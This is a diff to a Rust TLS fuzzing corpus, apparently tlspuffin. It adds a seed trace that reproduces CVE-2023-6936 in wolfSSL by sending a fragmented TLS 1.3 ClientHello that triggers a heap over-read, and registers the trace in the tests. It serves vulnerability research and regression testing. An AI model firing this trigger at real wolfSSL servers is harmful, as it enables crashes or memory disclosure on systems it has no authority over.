@@ -45,6 +45,9 @@ pub fn create_corpus(
 
         // Downgrade attack: the client offers both TLS 1.2 and TLS 1.3 (`TLSVersion::Both`).
         seed_cve_2024_5814: put.supports("tls12") && put.supports("tls13"),
+
+        // Fragmented TLS 1.3 ClientHello (<123 bytes) triggers heap-buffer-overflow in AddPacketInfo.
+        seed_cve_2023_6936: put.supports("tls13"),
     )
 }
 
@@ -1845,6 +1848,65 @@ pub fn seed_server_attacker_full_cve_2021_3336(client: AgentName) -> Trace<TLSPr
     }
 }
 
+/// <https://nvd.nist.gov/vuln/detail/CVE-2023-6936> (CALLB)
+///
+/// wolfSSL 5.5.2 to 5.6.5 built with WOLFSSL_CALLBACKS reads 5 bytes past a received
+/// handshake message of fewer than 123 bytes in AddPacketInfo (called from
+/// DoTls13HandShakeMsgType), e.g. a fragmented TLS 1.3 ClientHello.
+#[puffin::witness("CVE-2023-6936")]
+pub fn seed_cve_2023_6936(server: AgentName) -> Trace<TLSProtocolTypes> {
+    let client_hello = term! {
+        fn_client_hello(
+            fn_protocol_version12,
+            fn_new_random,
+            fn_empty_session_id,
+            (fn_cipher_suites_make(
+                (fn_append_cipher_suite(
+                    fn_new_cipher_suites,
+                    fn_cipher_suite13_aes_128_gcm_sha256
+                ))
+            )),
+            fn_compressions,
+            (fn_client_extensions_make(
+                (fn_client_extensions_append(
+                    (fn_client_extensions_append(
+                        (fn_client_extensions_append(
+                            fn_client_extensions_new,
+                            fn_supported_versions13_extension
+                        )),
+                        (fn_signature_algorithm_extension(
+                            (fn_supported_signature_schemes_extension_append(
+                                fn_supported_signature_schemes_extension_new,
+                                fn_rsa_pss_signature_algorithm
+                            ))
+                        ))
+                    )),
+                    (fn_key_share_extension_make(
+                        (fn_key_share_extension_append(
+                            fn_key_share_extension_new,
+                            (fn_key_share_deterministic(fn_named_group_x25519))
+                        ))
+                    ))
+                ))
+            ))
+        )
+    };
+
+    let fragmented_client_hello = term! {
+        fn_split_handshake_flight((@client_hello))
+    };
+
+    Trace {
+        prior_traces: vec![],
+        descriptors: vec![TLSDescriptorConfig::new_server(server, TLSVersion::V1_3)],
+        steps: vec![Step {
+            agent: server,
+            action: Action::Input(input_action! { fragmented_client_hello }),
+        }],
+        ..Default::default()
+    }
+}
+
 #[cfg(test)]
 pub mod tests {
     use puffin::algebra::TermType;
@@ -1866,6 +1928,7 @@ pub mod tests {
             seed_freak.build_named_trace(),
             seed_cve_2022_25640_simple.build_named_trace(),
             seed_cve_2022_38153.build_named_trace(),
+            seed_cve_2023_6936.build_named_trace(),
             // TODO: 685 seed_cve_2022_39173.build_named_trace(),
             // TODO: 1695 seed_cve_2022_39173_full.build_named_trace(),
             // TODO: 322 seed_cve_2022_39173_minimized.build_named_trace(),
